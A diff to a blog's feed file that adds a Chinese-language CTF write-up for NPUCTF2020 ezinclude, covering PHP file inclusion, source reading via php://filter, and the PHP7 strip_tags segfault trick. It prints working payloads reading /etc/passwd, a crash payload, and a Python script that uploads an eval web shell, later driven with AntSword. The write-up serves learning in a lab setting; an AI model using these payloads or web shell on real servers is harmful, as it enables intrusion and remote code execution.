@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>NPUCTF2020 ezinclude_0x90-0x9F</title>
+      <link href="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/"/>
+      <url>/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</url>
+      
+        <content type="html"><![CDATA[<p>最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p><p>进去直接来个错误？？？WTF?</p><p>看下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p><p>疑似哈希长度拓展攻击，抓下包看看</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p><p>芜湖，hash直接给我了？</p><p>直接传好像不太行?</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p><p>祭出神器burp</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p><p>得到文件名 flflflflag.php</p><p>访问一下文件:</p><p>得到如下response</p><pre><code class="html">HTTP/1.1 200 OKServer: openrestyDate: Sun, 13 Feb 2022 04:47:35 GMTContent-Type: text/html; charset=UTF-8Content-Length: 241Connection: closeVary: Accept-EncodingX-Powered-By: PHP/7.0.33&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>我已经有了女朋友所以我比出题人强(手动狗头)</p><p>include 函数好家伙，文件包含应该有了</p><p>来读取下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p><p>解码如下:</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;</code></pre><p>过滤了很多东西，没法命令执行了。</p><p>那就扫一下目录把:</p><p>最终扫出来了一个</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p><p>这个目录应该是告诉我们文件的名字，来结合文件包含使用。所以我们就要尝试去传shell</p><p>可以用php7 segment fault特性</p><blockquote><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p></blockquote><p>参考链接；<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这里我们可以直接知道文件名就不需要爆破了</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><pre><code>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</code></pre><p>payload</p><pre><code class="php">php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwdphp7 老版本通杀php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>由于tmp目录一般是不可访问的，所以该漏洞常常和文件包含结合起来使用</p><p>exp如下:</p><pre><code class="python">import requestsfrom io import BytesIOurl=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><p>运行</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p><p>这里多了一个文件</p><p>使用蚁剑连接</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p><p>测试成功了，但是无法添加，，莫名的错误</p><p>同理那就再添加个phpinfo吧</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p><p>成功找到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> 刷题 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代码\命令执行类 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>红明谷CTF 2021 write_shell_0x81-0x8F</title>
       <link href="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
       <url>/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</url>
